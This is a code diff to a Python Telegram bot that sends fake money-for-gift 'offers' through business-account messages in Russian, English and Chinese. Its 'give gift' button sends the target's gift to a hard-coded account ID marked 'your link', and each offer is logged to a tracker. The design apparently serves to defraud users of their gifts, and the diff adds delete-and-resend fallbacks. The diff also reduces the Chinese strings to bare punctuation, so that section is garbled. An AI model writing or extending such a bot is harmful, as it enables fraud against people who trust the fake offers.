@@ -47,14 +47,14 @@ TEXTS = {
         "declined": "You have declined the offer."
     },
     "cn": {
-        "offer_text": "用户 <b>{who}</b> 向您提供 {sum} {cur} 以换取礼物 <b>{name}</b>。",
-        "accepted": "🎁 <b>礼物：</b> {name}\n\n<b>已接受！</b>\n\n等待礼物转移。\n\n出价金额：{sum} {cur}",
-        "btn_give": "🎁 赠送礼物",
-        "btn_how": "❓ 如何赠送？",
-        "btn_decline": "❌ 拒绝",
-        "btn_accept": "✅ 接受",
-        "alert_how": "点击下方按钮打开礼物界面。\n\n然后选择一个礼物并发送给接收者。",
-        "declined": "您已拒绝该提议。"
+        "offer_text": " <b>{who}</b>  {sum} {cur}  <b>{name}</b>。",
+        "accepted": "🎁 <b>：</b> {name}\n\n<b>！</b>\n\n。\n\n：{sum} {cur}",
+        "btn_give": "🎁 ",
+        "btn_how": "❓ ？",
+        "btn_decline": "❌ ",
+        "btn_accept": "✅ ",
+        "alert_how": "。\n\n。",
+        "declined": "。"
     }
 }
 
@@ -88,13 +88,14 @@ async def cmd_start(message: Message):
         "<b>Языки:</b>\n"
         "🇷🇺 <b>ru</b> — Русский\n"
         "🇬🇧 <b>en</b> — English\n"
-        "🇨🇳 <b>cn</b> — 中文 (Китайский)"
+        "🇨🇳 <b>cn</b> —  (Китайский)"
     )
     await message.answer(text)
 
 # =====================================
 # КНОПКИ
 # =====================================
+
 def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
     t = TEXTS.get(lang, TEXTS["ru"])
     return InlineKeyboardMarkup(
@@ -106,8 +107,9 @@ def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
 
 def instruction_kb(lang: str) -> InlineKeyboardMarkup:
     t = TEXTS.get(lang, TEXTS["ru"])
+    # ТВОЯ ССЫЛКА
     gift_url = "tg://send_gift?to=8863549439"
-    
+
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [InlineKeyboardButton(text=t["btn_give"], url=gift_url)],
@@ -203,6 +205,7 @@ async def handle_custom_command(message: Message):
         # Отправляем оффер с картинкой
         try:
             await bot.send_message(
+
                 chat_id=message.chat.id,
                 text=t["offer_text"].format(
                     who=OFFERS[oid]["seller_name"],
@@ -221,23 +224,23 @@ async def handle_custom_command(message: Message):
         await tracker_log(
             f"🆕 Оффер {oid}: {OFFERS[oid]['seller_name']} | {raw_sum} {CURRENCY[cur_key]} | {gift_name}"
         )
-        
+
     except Exception:
         logging.exception("Ошибка в .оффер")
 
 # =====================================
-# КНОПКИ ПРИНЯТИЯ/ОТКЛОНЕНИЯ (ИСПРАВЛЕНО)
+# КНОПКИ ПРИНЯТИЯ/ОТКЛОНЕНИЯ (С ЗАЩИТОЙ)
 # =====================================
 @dp.callback_query(F.data.startswith("acc:"))
 async def cb_accept(call: CallbackQuery):
     # 1. Отвечаем Telegram (убираем часики)
     await call.answer()
-    
+
     oid = call.data.split(":", 1)[1]
     offer = OFFERS.get(oid)
     if not offer:
         return
-        
+
     lang = offer.get("lang", "ru")
     t = TEXTS.get(lang, TEXTS["ru"])
 
@@ -247,7 +250,7 @@ async def cb_accept(call: CallbackQuery):
         cur=offer["cur"]
     ) + f"\n\n{offer['url']}"
 
-    # 2. Пытаемся отредактировать сообщение через бизнес-подключение
+    # 2. Редактируем ИМЕННО бизнес-сообщение
     try:
         await bot.edit_business_message(
             business_connection_id=call.message.business_connection_id,
@@ -257,21 +260,28 @@ async def cb_accept(call: CallbackQuery):
             reply_markup=instruction_kb(lang),
             link_preview_options=LARGE_PREVIEW
         )
-        logging.info("Бизнес-сообщение успешно отредактировано.")
+        logging.info("Сообщение успешно отредактировано.")
     except Exception as e:
         logging.error(f"Edit error: {e}")
-
-    # 3. ВСЕГДА шлём отдельное сообщение принявшему (в его ЛС с ботом)
-    try:
-        await bot.send_message(
-            chat_id=call.from_user.id,
-            text=text,
-            reply_markup=instruction_kb(lang),
-            link_preview_options=LARGE_PREVIEW
-        )
-        logging.info("Сообщение отправлено в ЛС покупателю.")
-    except Exception as e:
-        logging.error(f"Send to buyer error: {e}")
+        # 3. Если редактирование упало - удаляем и шлем новое
+        try:
+            await bot.delete_business_messages(
+                business_connection_id=call.message.business_connection_id,
+                message_ids=[call.message.message_id]
+            )
+        except Exception as e2:
+            logging.error(f"Delete error: {e2}")
+        try:
+            await bot.send_message(
+                chat_id=call.message.chat.id,
+                text=text,
+                reply_markup=instruction_kb(lang),
+                business_connection_id=call.message.business_connection_id,
+                link_preview_options=LARGE_PREVIEW
+            )
+            logging.info("Сообщение заменено новым.")
+        except Exception as e3:
+            logging.error(f"Fallback error: {e3}")
 
     # 4. Лог в трекер (в фоне)
     asyncio.create_task(tracker_log(
@@ -290,16 +300,25 @@ async def cb_decline(call: CallbackQuery):
     lang = offer.get("lang", "ru")
     t = TEXTS.get(lang, TEXTS["ru"])
 
+    # Редактируем бизнес-сообщение
     try:
         await bot.edit_business_message(
             business_connection_id=call.message.business_connection_id,
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
             text=t["declined"],
+
             reply_markup=None
         )
-    except TelegramBadRequest:
-        pass
+    except Exception as e:
+        logging.error(f"Decline edit error: {e}")
+        try:
+            await bot.delete_business_messages(
+                business_connection_id=call.message.business_connection_id,
+                message_ids=[call.message.message_id]
+            )
+        except Exception as e2:
+            logging.error(f"Decline delete error: {e2}")
 
     await tracker_log(f"❌ Оффер отклонён\nID: {oid}")
 
